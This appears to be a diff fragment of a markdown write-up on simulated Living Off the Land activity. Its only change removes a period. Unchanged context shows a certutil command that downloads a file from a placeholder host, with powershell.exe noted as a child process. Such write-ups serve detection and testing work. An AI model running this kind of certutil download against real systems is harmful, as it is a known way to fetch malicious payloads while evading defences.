@@ -52,7 +52,7 @@ Child process: powershell.exe
 
 ## Description
 
-certutil was used to simulate Living Off the Land behaviour.
+certutil was used to simulate Living Off the Land behaviour
 
 ## Command Used
 certutil.exe -urlcache -split -f http://example.com file.txt
